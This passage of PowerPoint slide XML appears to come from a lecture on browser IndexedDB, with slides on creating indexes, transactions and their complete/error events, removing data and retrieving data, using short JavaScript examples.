              <a:rPr lang="fi-FI" sz="2400" b="1" dirty="0"/>
              <a:t>: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2400" i="1" dirty="0"/>
              <a:t>"</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2400" i="1" dirty="0" err="1"/>
              <a:t>keyName</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2400" i="1" dirty="0"/>
              <a:t>"</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2400" b="1" dirty="0"/>
              <a:t> });</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="514350" indent="-514350">
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>Create indexes for faster queries using</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="fi-FI" sz="2400" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0" err="1"/>
              <a:t>objectStore.createIndex</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0"/>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>"</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" i="1" dirty="0"/>
              <a:t>name</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>", "</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" i="1" dirty="0"/>
              <a:t>name</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>", { unique: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" i="1" dirty="0"/>
              <a:t>true</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t> }</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0"/>
              <a:t>)</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>;</a:t>
            </a:r>
            <a:endParaRPr lang="fi-FI" sz="2400" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="514350" indent="-514350">
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>Start a transaction and make a request to do some database operation, like adding or retrieving data.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="514350" indent="-514350">
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>Wait for the operation to complete by listening to the right kind of event handler</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="514350" indent="-514350">
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>Do something with the results, which can be found on the request object.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="514350" indent="-514350">
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
              <a:defRPr/>
            </a:pPr>
            <a:endParaRPr lang="fi-FI" sz="24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itle 1">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{20F4C077-CFF9-42B5-B31F-932CE9A0B507}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" b="1"/>
              <a:t>IndexedDB</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" b="1" dirty="0"/>
              <a:t> Transactions</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="175107" name="Content Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{46E58488-AB2A-4C1B-95E3-7D6AFAAE39AB}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2400" i="1" dirty="0" err="1">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>objectStore</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2400" dirty="0" err="1">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2400" b="1" dirty="0" err="1">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>transaction.oncomplete</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2400" dirty="0">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> = </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2400" dirty="0" err="1">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>function</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2400" dirty="0">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2400" dirty="0" err="1">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>event</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2400" dirty="0">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>) {</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2400">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>  var </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2400" dirty="0" err="1">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>transaction</a:t>
            </a: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db.transaction</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2400" dirty="0">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>("</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2400" i="1" dirty="0" err="1">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>name</a:t>
            </a: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readwrite</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2400" dirty="0">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>").</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2400" dirty="0" err="1">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>objectStore</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2400" dirty="0">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>("</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2400" i="1" dirty="0" err="1">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>name</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2400"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transaction.add</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2400" dirty="0">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>({</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2400" i="1" dirty="0" err="1">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>key</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2400" dirty="0">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2400" i="1" dirty="0" err="1">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>value</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2400" i="1" dirty="0">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>, key2: value2</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2400"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fi-FI" altLang="fi-FI" sz="2400" dirty="0">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>  };</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buNone/>
            </a:pP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transaction</a:t>
            </a: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can</a:t>
            </a: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be</a:t>
            </a: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rolled</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2400" dirty="0">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2400" dirty="0" err="1">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>back</a:t>
            </a:r>
            <a:endParaRPr lang="fi-FI" altLang="fi-FI" sz="2400" dirty="0">
              <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2400" dirty="0" err="1">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>Transaction.abort</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2400"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endParaRPr lang="fi-FI" altLang="fi-FI"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1">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{8AB68790-41D0-40AA-AE19-37925FA9895A}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI"/>
              <a:t>Transaction Events</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Content Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{D7E3C58A-6F79-4AEC-8F6E-F2A1CCB0DD1C}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit fontScale="92500" lnSpcReduction="10000"/>
          </a:bodyPr>
          <a:lstStyle/>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Do something when all the data is added to the database. */</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buNone/>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" i="1" dirty="0" err="1">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>transaction</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">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oncomplete</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> =  function(event) {</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alert("All done!");</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endParaRPr lang="en-US" dirty="0">
              <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buNone/>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" i="1" dirty="0" err="1">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>transaction</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">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onerror</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> = function(event) {</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 Don't forget to handle errors!</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a:t>
            </a:r>
            <a:endParaRPr lang="fi-FI" dirty="0">
              <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>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itle 1">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{FDB899EE-29E7-4F4C-AD0C-E3707B9E4373}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI"/>
              <a:t>Removing Data</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="177155" name="Content Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{A51F8CA0-8F8C-4A1B-9D64-301F707FDABB}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2800">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>var </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2800" dirty="0">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>request = </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2800" dirty="0" err="1">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>db.transaction</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2800" dirty="0">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>(["</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2800" i="1" dirty="0" err="1">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>dbBame</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2800" dirty="0">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>"], "</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2800" dirty="0" err="1">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>readwrite</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2800" dirty="0">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>").</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2800" dirty="0" err="1">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>objectStore</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2800" dirty="0">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>("</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2800" i="1" dirty="0">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>name</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2800" dirty="0">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>").delete("</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2800" i="1" dirty="0">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>key</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2800"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en-US" altLang="fi-FI" sz="2800" dirty="0" err="1">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>request.onsuccess</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2800" dirty="0">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> = function(event) {</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2800" dirty="0">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>  // It's gone!</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2800" dirty="0">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>};</a:t>
            </a:r>
            <a:endParaRPr lang="fi-FI" altLang="fi-FI" sz="2800" dirty="0">
              <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>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itle 1">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{8D3C29E2-B457-4C33-85F8-456F8C8FABC4}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI"/>
              <a:t>Getting Data from IndexedDB</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Content Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{60DDFCD0-0468-40D7-AD49-B1618FE4C3BA}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit fontScale="92500" lnSpcReduction="20000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buNone/>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="fi-FI">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>var </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" i="1" dirty="0" err="1">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>transaction</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db.transaction</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" dirty="0">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>(["</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" i="1" dirty="0" err="1">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>name</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a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>var </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" i="1" dirty="0" err="1">
